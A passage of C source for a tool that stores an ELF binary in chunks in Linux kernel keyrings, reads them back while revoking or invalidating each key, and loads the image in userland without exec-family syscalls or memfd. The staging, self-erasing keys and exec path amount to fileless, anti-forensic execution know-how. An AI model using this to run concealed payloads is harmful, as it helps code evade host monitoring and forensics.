     *   nikeys   instantiated keys (revoked-but-not-GCed keys drop out)
     *   maxkeys  the LIVE sysctl limit (watched it flip 2000 -> 10 -> 2000
     *            with the sysctl; add_key enforced it the same second)
     *   qnbytes/maxbytes   byte-quota charge / live limit
     * The row's maxima are therefore authoritative (they track the live
     * sysctls); the sysctl read above is the fallback. The quota charges
     * the euid's user record; match it first, fall back to the uid. No
     * row at all (fresh boot, no key ever created for this uid) degrades
     * cleanly to used=0, measured=0.
     */
    {
        unsigned long want[2] = { (unsigned long)geteuid(),
                                  (unsigned long)getuid() };
        FILE *f = fopen("/proc/key-users", "r");

        if (f) {
            char line[256];

            while (fgets(line, sizeof line, f)) {
                unsigned long uid, usage, nk, nkq, nik, kmax2, nb, bmax2;

                if (sscanf(line, "%lu: %lu %lu/%lu %lu/%lu %lu/%lu",
                           &uid, &usage, &nk, &nkq, &nik, &kmax2,
                           &nb, &bmax2) != 8)
                    continue;
                if (uid != want[0] && uid != want[1])
                    continue;
                q->keys_used = nk ? nk : nkq;
                q->bytes_used = nb;
                if (kmax2)
                    q->keys_max = kmax2;
                if (bmax2)
                    q->bytes_max = bmax2;
                q->measured = 1;
                break;
            }
            fclose(f);
        }
    }
    q->bytes_remaining = q->bytes_used < q->bytes_max ?
                         q->bytes_max - q->bytes_used : 0;
    return 0;
}

/* number of chunk keys a wire of `wirelen` bytes needs at `chunkmax` */
static size_t quota_chunks_for(size_t wirelen, size_t chunkmax)
{
    return (wirelen + chunkmax - 1) / chunkmax;
}

/*
 * qnbytes a wire of `wirelen` bytes under `type` will charge, planned
 * with the measured per-key overhead (see keyringer.h) plus round-up
 * slack per key: user keys charge desc + chunk + 5, big_key keys charge
 * desc + 21 FIXED (payload not byte-charged on this kernel — still
 * counted conservatively here for nothing, because the payload simply is
 * not part of the byte bill; cross-kernel drift is covered by slack +
 * the mid-stash EDQUOT rollback).
 */
static unsigned long quota_wire_charge(const char *type, size_t desclen,
                                       size_t wirelen)
{
    size_t chunkmax = stash_chunk_size(type);
    size_t n = quota_chunks_for(wirelen, chunkmax);
    unsigned long oh = strcmp(type, KR_TYPE_BIGKEY) == 0 ?
                       KR_QUOTA_BIGKEY_OH : KR_QUOTA_USER_OH;
    unsigned long total = 0;

    for (size_t i = 0; i < n; i++) {
        size_t off = i * chunkmax;
        size_t clen = wirelen - off < chunkmax ? wirelen - off : chunkmax;

        if (strcmp(type, KR_TYPE_BIGKEY) == 0)
            clen = 0;         /* payload escapes the byte quota here */
        total += desclen + clen + oh + KR_QUOTA_SLACK;
    }
    return total;
}

/*
 * Upfront stash planning, run in kr_stash BEFORE the first add_key:
 * auto-select big_key when the "user" chunk count would exceed maxkeys
 * (the maxkeys-relief mechanism only — never claimed as byte relief),
 * then refuse cleanly — before storing ANYTHING — when the planned
 * charge exceeds what remains, and warn (nonfatal) above 50% of the
 * remaining bytes. Returns the effective key type; NULL on refusal with
 * err set. Telemetry unavailable => returns the requested type as-is
 * (the mid-stash EDQUOT rollback remains the backstop).
 */
static const char *plan_stash_quota(const kr_opts *o, const char *prefix,
                                    const uint8_t *payload, size_t plen,
                                    size_t wirelen, int selfcontained,
                                    char *err)
{
    const char *want = stash_key_type(o);
    const char *type = want;
    kr_quota q;
    size_t ldso_wire = 0;
    int have_ldso = 0;
    unsigned long needed;
    size_t total_keys;

    if (kr_quota_snapshot(&q, err) != 0)
        return want;              /* no telemetry: EDQUOT backstop applies */

    /* --selfcontained: the interpreter wire joins the bill (v3 header) */
    if (selfcontained) {
        char ipath[DESC_MAX * 4];
        int has_interp = find_pt_interp(payload, plen, ipath, sizeof ipath,
                                        NULL);

        if (has_interp == 1) {
            struct stat st;

            if (stat(ipath, &st) == 0) {
                size_t hdr = wire_sel() == 2 ? KR_HDR_LEN : KR_HDR3_LEN;

                ldso_wire = hdr + (size_t)st.st_size;
                have_ldso = 1;
            }
        }
        /* has_interp < 0 (raw payload): the real .ldso. path below keeps
         * today's behavior and fails there; planning stays payload-only */
    }

    /*
     * maxkeys awareness: only when the user did NOT pass --type, and
     * only as maxkeys relief — if the "user" chunk count does not fit
     * under keys_max but the big_key chunk count does, switch (and say
     * so). If even big_key does not fit, fall through to the refusal.
     */
    if (!(o && o->key_type && o->key_type[0]) && q.keys_max > 0) {
        size_t nuser = quota_chunks_for(wirelen, KR_CHUNK_MAX) +
                       (have_ldso ? quota_chunks_for(ldso_wire,
                                                     KR_CHUNK_MAX) : 0);
        size_t nbk = quota_chunks_for(wirelen, KR_CHUNK_BIGKEY) +
                     (have_ldso ? quota_chunks_for(ldso_wire,
                                                   KR_CHUNK_BIGKEY) : 0);

        if (q.keys_used + nuser > q.keys_max &&
            q.keys_used + nbk <= q.keys_max) {
            type = KR_TYPE_BIGKEY;
            kr_logf("stash: auto big_key (chunk count would exceed "
                    "maxkeys)");
        }
    }

    needed = quota_wire_charge(type, strlen(prefix) + 4, wirelen) +
             (have_ldso ? quota_wire_charge(type, strlen(prefix) + 9,
                                            ldso_wire) : 0) +
             KR_QUOTA_SLACK_ONCE;
    total_keys = quota_chunks_for(wirelen, stash_chunk_size(type)) +
                 (have_ldso ? quota_chunks_for(ldso_wire,
                                               stash_chunk_size(type)) : 0);

    if (q.bytes_max > 0 && needed > q.bytes_remaining) {
        seterr(err, "stash: needs ~%lu bytes of keyring quota, ~%lu remain "
               "(used %lu/%lu, live /proc/key-users measurement) — options: "
               "smaller payload; --type big_key (fewer, larger keys: "
               "100000-byte chunks; this kernel charges a big_key desc+21 "
               "and does NOT byte-charge its payload); run as root (25 MiB); "
               "or pool across UIDs with --share",
               needed, q.bytes_remaining, q.bytes_used, q.bytes_max);
        return NULL;
    }
    if (q.bytes_max > 0 && needed > q.bytes_remaining / 2)
        kr_logf("stash: warning: this stash would consume ~%lu of %lu "
                "remaining quota bytes (>50%%)",
                needed, q.bytes_remaining);
    if (q.keys_max > 0 && q.keys_used + total_keys > q.keys_max) {
        seterr(err, "stash: needs %zu keyring key(s) on top of %lu/%lu used "
               "(live /proc/key-users measurement) — options: --type big_key "
               "(fewer, larger keys — the maxkeys relief); smaller payload; "
               "run as root; or pool across UIDs with --share",
               total_keys, q.keys_used, q.keys_max);
        return NULL;
    }
    return type;
}

int kr_stash(const void *buf, size_t len, const kr_opts *o, char err[KR_ERRSZ])
{
    const char *prefix = o && o->desc_prefix ? o->desc_prefix : KR_DEFAULT_DESC;
    const char *type = stash_key_type(o);
    int persistent = o && o->persistent;
    int selfcontained = o && o->selfcontained;
    uint8_t *wire = NULL;
    size_t wirelen = 0;
    serials_t sv = { 0 };
    long ring;
    int stored = 0;

    if (!buf || len == 0)
        return seterr(err, "stash: empty input");
    if (strlen(prefix) + 5 > DESC_MAX)
        return seterr(err, "stash: prefix \"%s\" too long", prefix);
    /*
     * wire v4 + --selfcontained: v4 ldso support is still pending (the
     * exec side reassembles the .ldso. interpreter wire through the
     * buffer path). An EXPLICIT KR_WIRE=4 still refuses cleanly; the
     * implicit default selection is downgraded to the v3 builder for
     * the WHOLE stash — payload and interpreter wires — inside
     * build_wire().
     */
    if (selfcontained && wire_v4_wanted())
        return seterr(err, "stash: v4 experimental: not with "
                      "--selfcontained yet");
    if (selfcontained && wire_sel() == 4)
        kr_logf("stash: --selfcontained uses wire v3 (v4 ldso support "
                "pending)");

    {
        uint8_t key[32];
        int have_key = 0;

        if (o && o->key_hex) {
            if (hex32(o->key_hex, key, err) != 0)
                return -1;
            have_key = 1;
        }
        /*
         * Wire v2: KRH1 header (sha256 of the plaintext) prepended,
         * body optionally sealed into a KR1 envelope — roundtrip
         * verified inside build_v2_wire BEFORE any chunk is stored.
         */
        if (build_wire(have_key ? key : NULL, buf, len,
                       &wire, &wirelen, selfcontained, err) != 0)
            return -1;
    }

    if (persistent) {
        ring = persistent_ring(err);
        if (ring == -1) {
            volatile_wipe(wire, wirelen);
            free(wire);
            return -1;
        }
    } else {
        ring = KEY_SPEC_SESSION_KEYRING;
    }

    /*
     * Upfront quota planning, BEFORE the first add_key: snapshot the
     * live per-UID quota, auto-select big_key when the "user" chunk
     * count would exceed maxkeys, refuse cleanly (nothing stored) when
     * the planned charge does not fit, warn nonfatal above 50% of the
     * remaining bytes. Unmeasurable quota => planning is skipped and
     * the mid-stash EDQUOT rollback stays the backstop.
     */
    {
        const char *plan_type = plan_stash_quota(o, prefix, buf, len,
                                                 wirelen, selfcontained, err);

        if (!plan_type) {
            volatile_wipe(wire, wirelen);
            free(wire);
            return -1;
        }
        type = plan_type;
    }

    /* payload chunks first */
    stored = store_chunks(wire, wirelen, type, prefix, ring, &sv, err);
    if (stored < 0) {
        volatile_wipe(wire, wirelen);
        free(wire);
        free(sv.v);
        return -1;
    }
    kr_logf("stash: %d payload chunk(s), %zu bytes stored on the %s keyring",
            stored, wirelen, persistent ? "persistent" : "session");
    volatile_wipe(wire, wirelen);
    free(wire);

    /*
     * --selfcontained: stash the ELF's PT_INTERP interpreter AFTER the
     * payload chunks, under "<prefix>.ldso.<idx>". The interpreter wire
     * is the KRH1 header (flags=0) + raw interpreter file bytes and is
     * ALWAYS plaintext regardless of --key — the interpreter is a
     * public artifact, so sealing it has no signature value; the digest
     * is still verified when the exec side reassembles it.
     */
    if (selfcontained) {
        char ipath[DESC_MAX * 4];
        int has_interp = find_pt_interp(buf, len, ipath, sizeof ipath, err);

        if (has_interp < 0) {
            serials_revoke_all(&sv);
            free(sv.v);
            return -1;
        }
        if (has_interp == 0) {
            kr_logf("stash: --selfcontained: payload has no PT_INTERP "
                    "(static ELF), nothing to embed");
        } else {
            uint8_t *iwire = NULL;
            size_t iwlen = 0;
            char ldesc[DESC_MAX];
            int istored;

            kr_logf("stash: --selfcontained: embedding interpreter %s", ipath);
            {
                void *ibuf = NULL;
                size_t ilen = 0;

                if (kr_read_file(ipath, &ibuf, &ilen, err) != 0) {
                    serials_revoke_all(&sv);
                    free(sv.v);
                    return -1;
                }
                /* interpreter wire: same selfcontained v3 downgrade */
                if (build_wire(NULL, ibuf, ilen, &iwire, &iwlen,
                               selfcontained, err) != 0) {
                    volatile_wipe(ibuf, ilen);
                    free(ibuf);
                    serials_revoke_all(&sv);
                    free(sv.v);
                    return -1;
                }
                volatile_wipe(ibuf, ilen);
                free(ibuf);
            }
            snprintf(ldesc, sizeof ldesc, "%s%s", prefix, KR_LDSO_SUFFIX);
            istored = store_chunks(iwire, iwlen, type, ldesc, ring, &sv, err);
            volatile_wipe(iwire, iwlen);
            free(iwire);
            if (istored < 0) {
                serials_revoke_all(&sv);
                free(sv.v);
                return -1;
            }
            kr_logf("stash: %d interpreter chunk(s) under %s.ldso.*",
                    istored, prefix);
            stored += istored;
        }
    }

    /*
     * --share: make every stored key (payload AND interpreter chunks)
     * accessible the same way default keyrings are: possessor+user get
     * all rights (the value /proc/keys shows as 3f3f0000). The serial
     * list printed by the CLI ("share: s1,s2,...") is parseable by
     * exec --from.
     */
    if (o && o->share) {
        for (size_t i = 0; i < sv.n; i++) {
            if (syscall(__NR_keyctl, KEYCTL_SETPERM, sv.v[i],
                        (unsigned long)KR_SHARE_PERM, 0, 0) == -1)
                kr_logf("stash: warning: SETPERM(key %ld) failed: %s",
                        sv.v[i], strerror(errno));
        }
        kr_logf("stash: share: SETPERM 0x%08lx applied to %zu key(s)",
                (unsigned long)KR_SHARE_PERM, sv.n);
    }

    if (o && o->serials_out && o->serials_out_n) {
        size_t ncopy = sv.n < o->serials_out_cap ? sv.n : o->serials_out_cap;

        for (size_t i = 0; i < ncopy; i++)
            o->serials_out[i] = sv.v[i];
        *o->serials_out_n = ncopy;
    }

    /*
     * --ttl SECONDS: KEYCTL_SET_TIMEOUT every stored key so the kernel
     * garbage-collects the stash even if the stashing process dies before
     * consuming it (crash-safe expiry; 0 == live until revoked/consumed).
     */
    if (o && o->ttl > 0) {
        int tset = 0;

        for (size_t i = 0; i < sv.n; i++) {
            if (syscall(__NR_keyctl, KEYCTL_SET_TIMEOUT, sv.v[i],
                        (unsigned long)o->ttl, 0) == -1)
                kr_logf("stash: warning: SET_TIMEOUT(key %ld, %lds) "
                        "failed: %s", sv.v[i], o->ttl, strerror(errno));
            else
                tset++;
        }
        kr_logf("stash: TTL %lds set on %d/%zu key(s)",
                o->ttl, tset, sv.n);
    }

    free(sv.v);
    return 0;
}

/* ===================================================================== */
/* Phase 2: read chunks back from the keyring, revoking each after read   */
/* ===================================================================== */

typedef enum {
    RING_SESSION,
    RING_PERSISTENT
} ring_t;

/*
 * Key types tried on lookup, in order, PER chunk index (wire v2.2):
 * "user" first, then "big_key" — mixed-type stashes are tolerated, and
 * whichever type serves chunk i is irrelevant to chunk i+1.
 */
static const char *const kr_key_types[] = { KR_TYPE_USER, KR_TYPE_BIGKEY };
#define KR_N_KEY_TYPES (sizeof kr_key_types / sizeof kr_key_types[0])

/* best-effort revoke of every remaining chunk key from idx onward */
static void revoke_from(ring_t ring, const char *prefix, size_t idx, int scrub)
{
    long pring = -1;

    if (ring == RING_PERSISTENT) {
        pring = persistent_ring(NULL);
        if (pring == -1)
            return;
    }
    for (; idx <= KR_IDX_MAX; idx++) {
        char desc[DESC_MAX];

        chunk_desc(desc, sizeof desc, prefix, idx);
        for (size_t t = 0; t < KR_N_KEY_TYPES; t++) {
            long s;

            if (ring == RING_SESSION)
                s = syscall(__NR_request_key, kr_key_types[t], desc, NULL,
                            KEY_SPEC_SESSION_KEYRING);
            else
                s = syscall(__NR_keyctl, KEYCTL_SEARCH, pring,
                            kr_key_types[t], desc, 0UL);
            if (s == -1 && errno == ENOKEY)
                continue;         /* not stored under this type */
            if (s == -1)
                break;            /* first hard stop == end of the sweep */
            if (scrub)
                syscall(__NR_keyctl, KEYCTL_INVALIDATE, s, 0, 0);
            else
                syscall(__NR_keyctl, KEYCTL_REVOKE, s, 0, 0);
        }
    }
}

/*
 * Locate one chunk key, trying every key type in kr_key_types order.
 * Returns the serial, or -1 with *enokey set when the description does
 * not resolve under any type (ENOKEY), or -1 with *erevoked set when it
 * resolves only to a revoked leftover (caller decides whether that is
 * fatal or worth falling back to the other ring), or -1 with err set on
 * any other failure.
 */
static long lookup_chunk(ring_t ring, const char *prefix, size_t idx,
                         int *enokey, int *erevoked, char *err)
{
    char desc[DESC_MAX];
    long pring = -1;

    chunk_desc(desc, sizeof desc, prefix, idx);
    *enokey = 0;
    *erevoked = 0;

    if (ring == RING_PERSISTENT) {
        /* persistent ring: GET_PERSISTENT gives the ring, SEARCH resolves */
        pring = persistent_ring(err);
        if (pring == -1) {
            *enokey = 1;           /* no persistent ring == nothing stashed */
            return -1;
        }
    }

    for (size_t t = 0; t < KR_N_KEY_TYPES; t++) {
        const char *type = kr_key_types[t];
        long s;

        if (ring == RING_SESSION)
            s = syscall(__NR_request_key, type, desc, NULL,
                        KEY_SPEC_SESSION_KEYRING);
        else
            s = syscall(__NR_keyctl, KEYCTL_SEARCH, pring, type, desc, 0UL);
        if (s != -1)
            return s;
        if (errno == ENOKEY)
            continue;              /* try the next type */
        if (errno == EACCES || errno == EPERM)
            continue;              /*
                                    * a ring we cannot search holds
                                    * nothing usable for us — treat like
                                    * ENOKEY (seen under sudo/mixed
                                    * creds: GET_PERSISTENT rings grant
                                    * their user class view+read only,
                                    * and possession does not propagate
                                    * through inherited session rings)
                                    */
        /* revoked leftovers linger until kernel GC unlinks them and can
         * shadow a description; report and let the caller decide (fatal
         * mid-sequence, fallback to the persistent ring at idx 0) */
        if (errno == EKEYREVOKED) {
            *erevoked = 1;
            seterr(err, "load: \"%s\" [%s] is revoked (leftover of a "
                   "consumed stash)", desc, type);
            continue;
        }
        seterr(err, "load: %s lookup(\"%s\") failed: %s",
               ring == RING_SESSION ? "request_key" : "keyctl(SEARCH, "
               "persistent)", desc, strerror(errno));
        return -1;
    }
    if (*erevoked)
        return -1;
    *enokey = 1;
    return -1;
}

/*
 * read one chunk key and revoke it immediately; returns 0 / -1+err.
 * The revoke is best-effort (warning only): under exec --from the keys
 * may be shared from another UID, where EPERM/EACCES on revoke is
 * expected and nonfatal.
 */
static int read_chunk(long serial, const char *desc,
                      uint8_t **data, size_t *datalen, int scrub, char *err)
{
    long sz = syscall(__NR_keyctl, KEYCTL_READ, serial, NULL, 0);

    if (sz == -1) {
        int e = errno;

        if (e == EKEYREVOKED)
            return seterr(err, "load: key %ld (\"%s\") is revoked — stale or "
                          "already consumed stash", serial, desc);
        return seterr(err, "load: keyctl(READ, key %ld) size probe failed: %s",
                      serial, strerror(e));
    }

    uint8_t *buf = NULL;

    if (sz > 0) {
        buf = mmap(NULL, (size_t)sz, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (buf == MAP_FAILED)
            return seterr(err, "load: chunk mmap failed: %s", strerror(errno));
        harden_anon(buf, (size_t)sz, 0, "chunk read buffer", KR_VMA_SCRATCH);
        long got = syscall(__NR_keyctl, KEYCTL_READ, serial, buf,
                           (unsigned long)sz);

        if (got == -1) {
            int e = errno;

            munmap(buf, (size_t)sz);
            if (e == EKEYREVOKED)
                return seterr(err, "load: key %ld (\"%s\") was revoked before "
                              "its read completed", serial, desc);
            return seterr(err, "load: keyctl(READ, key %ld) failed: %s",
                          serial, strerror(e));
        }
        sz = got;
    }

    /*
     * read complete — revoke immediately. --scrub instead destroys the
     * key with KEYCTL_INVALIDATE: unlinked from every ring and gone —
     * nothing lingers in /proc/keys as a revoked ghost, and nothing can
     * be replayed. Invalidate MUST happen while we still possess the
     * key (we do: request_key linked it into our session ring on
     * lookup) — after an unlink the owner permission mask (view-only)
     * makes it EACCES.
     */
    if (scrub) {
        if (syscall(__NR_keyctl, KEYCTL_INVALIDATE, serial, 0, 0) == -1)
            kr_logf("load: warning: invalidate of key %ld failed: %s",
                    serial, strerror(errno));
        else
            kr_logf("load: %s -> key %ld, %ld bytes, invalidated",
                    desc, serial, sz);
    } else {
        if (syscall(__NR_keyctl, KEYCTL_REVOKE, serial, 0, 0) == -1)
            kr_logf("load: warning: revoke of key %ld failed: %s",
                    serial, strerror(errno));
        kr_logf("load: %s -> key %ld, %ld bytes, revoked", desc, serial, sz);
    }

    *data = buf;
    *datalen = (size_t)sz;
    return 0;
}

/*
 * Read a full "<prefix>.*" chunk sequence from the keyrings, revoking
 * every key as its read completes, and concatenate the raw wire.
 *
 * When `serials` is non-NULL (wire v2.2 --from), chunk i is read
 * directly from serials[i] (KEYCTL_READ size probe + read, no
 * request_key) and the revoke after read is best-effort — EPERM/EACCES
 * is nonfatal because shared keys from other UIDs may not be revocable
 * by us. Otherwise the sequence is located by description: the session
 * ring first; if chunk 000 cannot be resolved there (ENOKEY, or only a
 * revoked leftover of a consumed stash), the whole sequence is retried
 * in the persistent ring. First full sequence wins — the ring that
 * serves chunk 000 serves the entire stash, never a mix. The first
 * ENOKEY gap terminates the sequence.
 */
static int load_chunk_sequence(const char *prefix, const long *serials,
                               size_t nserials, int scrub,
                               uint8_t **out, size_t *outlen, char *err)
{
    ring_t ring = RING_SESSION;
    long serial;
    uint8_t **chunks = NULL;
    size_t *clens = NULL;
    size_t n = 0, cap = 0, total = 0;

    if (!serials) {
        int enokey = 0, erev = 0;

        serial = lookup_chunk(RING_SESSION, prefix, 0, &enokey, &erev, err);
        if (serial == -1 && !enokey && !erev)
            return -1;
        int stale_session = erev;

        if (serial == -1) {
            serial = lookup_chunk(RING_PERSISTENT, prefix, 0, &enokey,
                                  &erev, err);
            if (serial == -1 && !enokey && !erev)
                return -1;
            if (serial == -1) {
                if (stale_session)
                    return seterr(err, "load: no live %s.* stash on the "
                                  "session keyring (only a revoked leftover "
                                  "of a consumed stash) and none on the "
                                  "persistent keyring — stash again", prefix);
                return seterr(err, "load: no %s.* keys found on the session "
                              "or persistent keyring (stash first)", prefix);
            }
            ring = RING_PERSISTENT;
            kr_logf("load: no %s.* stash on the session ring; using the "
                    "persistent keyring", prefix);
        }
    }

    for (size_t i = 0; ; i++) {
        char desc[DESC_MAX];
        uint8_t *data = NULL;
        size_t datalen = 0;

        if (serials) {
            if (i >= nserials)
                break;             /* exactly as many chunks as serials */
            serial = serials[i];
        } else if (i > 0) {
            int enokey = 0, erev = 0;

            serial = lookup_chunk(ring, prefix, i, &enokey, &erev, err);
            if (serial == -1 && !enokey && !erev)
                goto fail;         /* hard error */
            if (serial == -1)
                break;             /* first gap == chunk count. A revoked
                                      chunk at the gap is a leftover of a
                                      PREVIOUS consumed stash poking out
                                      under the same prefix — treat it as
                                      the sequence end; a truncated live
                                      stash is caught by the wire v2.2
                                      digest check anyway. */
        }
        chunk_desc(desc, sizeof desc, prefix, i);
        if (read_chunk(serial, desc, &data, &datalen, scrub, err) != 0) {
            if (!serials)
                revoke_from(ring, prefix, i + 1, scrub);
            goto fail;
        }
        if (n == cap) {
            size_t ncap = cap ? cap * 2 : 8;
            uint8_t **nc = realloc(chunks, ncap * sizeof *nc);
            size_t *nl = realloc(clens, ncap * sizeof *nl);

            if (!nc || !nl) {
                free(nc);
                free(nl);
                munmap(data, datalen);
                if (!serials)
                    revoke_from(ring, prefix, i + 1, scrub);
                seterr(err, "load: out of memory");
                goto fail;
            }
            chunks = nc;
            clens = nl;
            cap = ncap;
        }
        chunks[n] = data;
        clens[n] = datalen;
        total += datalen;
        n++;
    }

    {
        uint8_t *img = malloc(total ? total : 1);

        if (!img) {
            seterr(err, "load: out of memory for %zu-byte image", total);
            goto fail;
        }
        size_t off = 0;

        for (size_t i = 0; i < n; i++) {
            if (clens[i]) {
                memcpy(img + off, chunks[i], clens[i]);
                volatile_wipe(chunks[i], clens[i]);
            }
            munmap(chunks[i], clens[i]);
            off += clens[i];
        }
        free(chunks);
        free(clens);
        kr_logf("load: %zu chunk(s), %zu bytes reassembled", n, total);
        *out = img;
        *outlen = total;
        return 0;
    }

fail:
    for (size_t k = 0; k < n; k++) {
        if (clens[k])
            volatile_wipe(chunks[k], clens[k]);
        munmap(chunks[k], clens[k]);
    }
    free(chunks);
    free(clens);
    return -1;
}

/* parse "1,2,3" serial lists for exec --from */
static int parse_serial_list(const char *spec, long **out, size_t *outn,
                             char *err)
{
    size_t cap = 8, n = 0;
    long *v = malloc(cap * sizeof *v);

    *out = NULL;
    *outn = 0;
    if (!v)
        return seterr(err, "load: out of memory");
    const char *p = spec;

    while (*p) {
        char *endp;
        long s = strtol(p, &endp, 10);

        if (endp == p || s <= 0) {
            free(v);
            return seterr(err, "load: --from: bad serial in \"%s\"", spec);
        }
        if (n == cap) {
            cap *= 2;
            long *nv = realloc(v, cap * sizeof *nv);

            if (!nv) {
                free(v);
                return seterr(err, "load: out of memory");
            }
            v = nv;
        }
        v[n++] = s;
        p = endp;
        if (*p == ',')
            p++;
        else if (*p != '\0') {
            free(v);
            return seterr(err, "load: --from: junk after serial in \"%s\"",
                          spec);
        }
    }
    if (n == 0) {
        free(v);
        return seterr(err, "load: --from: empty serial list");
    }
    *out = v;
    *outn = n;
    return 0;
}

int kr_load_revoke(const kr_opts *o, void **out, size_t *outlen, char err[KR_ERRSZ])
{
    const char *prefix = o && o->desc_prefix ? o->desc_prefix : KR_DEFAULT_DESC;
    uint8_t *wire = NULL;
    size_t wirelen = 0;

    if (strlen(prefix) + 5 > DESC_MAX)
        return seterr(err, "load: prefix \"%s\" too long", prefix);

    if (o && o->from_serials && o->from_serials[0]) {
        long *serials = NULL;
        size_t nserials = 0;

        if (parse_serial_list(o->from_serials, &serials, &nserials, err) != 0)
            return -1;
        kr_logf("load: --from: reading %zu chunk(s) directly from the "
                "given serial(s)", nserials);
        if (load_chunk_sequence(prefix, serials, nserials,
                                o && o->scrub, &wire, &wirelen, err) != 0) {
            free(serials);
            return -1;
        }
        free(serials);
    } else {
        if (load_chunk_sequence(prefix, NULL, 0, o && o->scrub,
                                &wire, &wirelen, err) != 0)
            return -1;
    }

    /*
     * Wire v4: an ENCRYPTED KRH4 stash is handed to the caller AS THE
     * WIRE ITSELF — kr_exec_image streams it (per-chunk AEAD decryption
     * straight into the mapped image; a full plaintext buffer never
     * exists). The header is validated here so a bogus v4 stash fails
     * with the same clean error as the other wires; the plaintext
     * (flags=0) v4 body goes through wire_open like v3. kr_call_symbol
     * takes the documented full-buffer exception instead (see there).
     */
    if (wirelen >= KR_HDR4_LEN && memcmp(wire, KR_WIRE4_MAGIC, 4) == 0 &&
        wire[4] == (uint8_t)KR_WIRE4_VERSION &&
        (wire[5] & KR_HDR4_FLAG_ENC) &&
        !(wire[5] & ~(uint8_t)KR_HDR4_FLAG_ENC)) {
        uint64_t pl = 0;
        uint32_t tt = 0;

        if (v4_parse_header(wire, wirelen, 1, &pl, &tt, err) != 0) {
            volatile_wipe(wire, wirelen);
            free(wire);
            return -1;
        }
        kr_logf("load: v4 encrypted stash (%llu-byte plaintext, %u "
                "pt-chunk(s)) handed to the streaming exec path%s",
                (unsigned long long)pl, tt,
                o && o->stream ? " (streaming requested)" : "");
        *out = wire;
        *outlen = wirelen;
        return 0;
    }

    /*
     * Wire open: KRH1 header validation + optional KR1 decryption +
     * SHA-256 integrity verification (mismatch is fatal — every
     * chunk key has already been revoked by the loop above), or the
     * legacy tolerance path. Consumes wire either way.
     */
    return wire_open(o, wire, wirelen, (uint8_t **)out, outlen, err);
}

/* ===================================================================== */
/* Phase 3: userland exec (no exec-family syscall, no memfd)              */
/* ===================================================================== */

typedef enum {
    BASE_FIXED_ZERO,  /* ET_EXEC: map at p_vaddr directly, base = 0     */
    BASE_PROBE,       /* ET_DYN: pick a base with a PROT_NONE hint mmap */
    BASE_AT_HINT      /* interpreter: caller supplies the base          */
} base_mode_t;

#define KR_MAX_IMG_RANGES 32

typedef struct {
    uint64_t start, end;             /* absolute mapped [start, end)      */
    uint32_t prot;                   /* final mprotect protection         */
} kr_map_range_t;

typedef struct {
    const uint8_t    *data;
    size_t            len;
    const Elf64_Ehdr *ehdr;
    const Elf64_Phdr *phdr;
    uint64_t          base;        /* bias added to every p_vaddr        */
    uint64_t          span;        /* page-rounded size of mapped image  */
    uint64_t          entry;       /* base + e_entry                     */
    int               has_interp;
    uint64_t          interp_off;  /* PT_INTERP location in the ELF buf  */
    uint64_t          interp_len;
    /* the ranges ACTUALLY mapped by map_pt_loads — the single source of
     * truth for later writes (relocation targets), because the vaddr span
     * between the lowest and highest segment is not necessarily mapped */
    kr_map_range_t    ranges[KR_MAX_IMG_RANGES];
    int               nranges;
} image_t;

/* ---- Phase 3.1: ELF validation ---- */
static int validate_elf(const uint8_t *d, size_t n, const char *what,
                        const Elf64_Ehdr **eh_out, const Elf64_Phdr **ph_out,
                        char *err)
{
    if (n < sizeof(Elf64_Ehdr))
        return seterr(err, "%s: %zu bytes: too small for an ELF header", what, n);

    const Elf64_Ehdr *eh = (const Elf64_Ehdr *)d;

    if (eh->e_ident[EI_MAG0] != ELFMAG0 || eh->e_ident[EI_MAG1] != ELFMAG1 ||
        eh->e_ident[EI_MAG2] != ELFMAG2 || eh->e_ident[EI_MAG3] != ELFMAG3)
        return seterr(err, "%s: missing \\x7fELF magic", what);
    if (eh->e_ident[EI_CLASS] != ELFCLASS64)
        return seterr(err, "%s: unsupported EI_CLASS %u (32-bit ELF rejected; "
                      "ELFCLASS64 required)", what, eh->e_ident[EI_CLASS]);
    if (eh->e_ident[EI_DATA] != ELFDATA2LSB)
        return seterr(err, "%s: unsupported EI_DATA %u (ELFDATA2LSB required)",
                      what, eh->e_ident[EI_DATA]);
    /*
     * e_machine is accepted only for this build's native architecture;
     * a foreign-arch payload gets the same clean error either way (the
     * x86 build rejects EM_AARCH64, the arm64 build rejects EM_X86_64).
     */
#ifdef __aarch64__
    if (eh->e_machine != EM_AARCH64)
        return seterr(err, "%s: unsupported e_machine %" PRIu16 " "
                      "(EM_AARCH64 required on this build)", what,
                      eh->e_machine);
#else
    if (eh->e_machine != EM_X86_64)
        return seterr(err, "%s: unsupported e_machine %" PRIu16 " "
                      "(EM_X86_64 required)", what, eh->e_machine);
#endif
    if (eh->e_type != ET_EXEC && eh->e_type != ET_DYN)
        return seterr(err, "%s: unsupported e_type %" PRIu16
                      " (only ET_EXEC/ET_DYN)", what, eh->e_type);
    if (eh->e_phentsize != sizeof(Elf64_Phdr))
        return seterr(err, "%s: e_phentsize %" PRIu16 " != %zu",
                      what, eh->e_phentsize, sizeof(Elf64_Phdr));
    if (eh->e_phnum == 0 || eh->e_phnum == PN_XNUM)
        return seterr(err, "%s: bad e_phnum %" PRIu16, what, eh->e_phnum);
    if (eh->e_phoff == 0 || eh->e_phoff % _Alignof(Elf64_Phdr) != 0 ||
        kr_oob(eh->e_phoff, (uint64_t)eh->e_phnum * sizeof(Elf64_Phdr), n))
        return seterr(err, "%s: program header table out of bounds or "
                      "misaligned", what);

    *eh_out = eh;
    *ph_out = (const Elf64_Phdr *)(d + eh->e_phoff);
    return 0;
}

/*
 * ---- Phase 3.2: map one image's PT_LOAD segments ----
 *
 * copy != 0 (every pre-v4 caller): map RW, copy the file contents from
 * d[] in, then mprotect to the final protection.
 * copy == 0 (wire-v4 streaming): map ZEROED RW and DEFER both the
 * contents and the final mprotect — the caller fills the ranges chunk
 * by chunk (v4_scatter) and applies ranges[].prot afterwards. d/n are
 * still used for the file-range bounds checks (n = FULL plaintext
 * length; d itself is never dereferenced in this mode).
 */
static int map_pt_loads(const uint8_t *d, size_t n, const Elf64_Ehdr *eh,
                        const Elf64_Phdr *ph, uint64_t base, const char *what,
                        image_t *img, int copy, char *err)
{
    for (uint16_t i = 0; i < eh->e_phnum; i++) {
        const Elf64_Phdr *p = &ph[i];

        if (p->p_type != PT_LOAD || p->p_memsz == 0)
            continue;
        if (p->p_memsz < p->p_filesz)
            return seterr(err, "%s: PT_LOAD %u: p_memsz < p_filesz", what, i);
        if (kr_oob(p->p_offset, p->p_filesz, n))
